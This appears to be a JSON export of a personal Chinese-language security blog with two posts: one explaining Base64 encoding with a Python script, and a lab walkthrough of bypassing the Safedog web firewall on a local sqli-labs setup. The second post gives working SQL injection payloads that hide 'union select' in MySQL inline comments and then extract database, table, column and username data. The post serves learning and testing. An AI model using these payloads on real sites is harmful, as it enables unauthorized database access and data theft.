{"meta":{"title":"Mlins's blog","subtitle":"Will you believe me all the time?","description":null,"author":"Mlins","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"Base64加密原理","slug":"Base64加密原理","date":"2018-06-02T16:07:33.000Z","updated":"2018-06-03T04:35:14.000Z","comments":true,"path":"2018/06/03/Base64加密原理/","link":"","permalink":"http://yoursite.com/2018/06/03/Base64加密原理/","excerpt":"","text":"回顾一下以前学的知识:Base64加密原理base64加密是先接受一串字符串，将其转化为二进制，然后再从前往后分组每组6个二进制位，不足6位的，再后面补0，如果补了几个00，则需要加密后再后面加几个=，下面就拿加密字符‘A’来讲解吧 1.将A转二进制010000012.把该二进制从前往后分6个二进制位一组，不足6位的后面补0: 010000 010000补了2个00，记下3.将二进制转化成十进制:16 164.根据base64独有字符表进行转化成字符16对应的是Q，所以转化之后的字符串为QQ5.填充=因为我们之前填充了两个00，所以最终加密结果为QQ==最后附上我用python写的一个简单加密程序12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding:utf-8 -*-decode=['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',0,1,2,3,4,5,6,7,8,9,'+','/']str1=''result=''row=''i=0number=raw_input(\"Please input will encode string:\")print '\\n'for x in number: h=bin(ord(x))[2:] if len(h)&lt;8: #判断每个字符转为二进制后是否为8位，不足高位补0 h='0'+h str1+=h#将所有二进制位合并for x in str1: if x!=' ': result+=str(x) #Base64 加密过程while i&lt;len(result):#判断填充=的个数 if len(result)%6==0: a3='' elif len(result)%6==2: a3='==' elif len(result)%6==4: a3='=' else: print 'ERROR'#切割二进制位 8变6，不够填充00 str2=result[i:i+6] while len(str2)&lt;6: str2+='00' print 'bin:'+str2+' dec:'+str(int(str2,2))+' base64:'+str(decode[int(str2,2)]) row+=str(decode[int(str2,2)]) i+=6print '\\nSuccessful Eecode: '+row+a3","categories":[],"tags":[],"keywords":[]},{"title":"Fuzz过狗注入","slug":"Fuzz过狗注入","date":"2018-05-31T13:13:14.000Z","updated":"2018-06-02T15:32:36.000Z","comments":true,"path":"2018/05/31/Fuzz过狗注入/","link":"","permalink":"http://yoursite.com/2018/05/31/Fuzz过狗注入/","excerpt":"春天不播种，夏天就不会生长，秋天就不能收割，冬天就不能品尝。","text":"春天不播种，夏天就不会生长，秋天就不能收割，冬天就不能品尝。 今天在虚拟机上安装一个WEB安全狗，打算绕绕狗然后也搭建一个sqli-labs注入环境先通过order by可判断字段数为3个，这里就不详细解释了当我们准备使用union select联合查询的时候，会被安全狗拦截原本打算写个脚本进行fuzz测试的，但是后来发现脚本跑出来的能绕狗，但是sql会报错，奇怪的是放入Mysql终端执行又能正常查询，没办法，只能手工fuzz测试 对于安全狗的拦截特征，个人理解是:123456因安全狗是根据特征来判断你输入的内容是否安全比如你单输入一个union不会被拦又或者你单输入一个select也不会被拦截但是如果你输入一个union select，就会被拦所以fuzz就是构造一些奇怪的字符又不会被数据库解析的东西从而来混淆安全狗的匹配规则 这里手工测试的过狗payload是:1?id=1+/*!union*//**//*!select*/+1,2,3+%23 可成功绕狗 然后就是查当前数据库名:1?id=-1+/*!union*//**//*!select*/+1,database/*!()*/,3+%23 接着查询表名，可通过修改limit 0,1的值来查询上下表1?id=-1+/*!union*//**//*!select*/+1,table_name,3+/*!from*//**//*!information_schema.tables*/+where+table_schema='security'+limit+0,1%23 继续查询字段名,可通过修改limit 0,1的值来查询上下字段1?id=-1+/*!union*//**//*!select*/+1,column_name,3+/*!from*//**//*!information_schema.columns*/+where+table_schema='security'/**//*!and*//**/table_name='users'+limit+1,1%23 最后就是查询字段内容,可通过修改limit 0,1来查询上下字段内容值1?id=-1+/*!union*//**//*!select*/+1,username,3+from+users+limit+1,1%23 是不是自己也想去试试呢？","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"http://yoursite.com/tags/bypass/"}],"keywords":[]}]}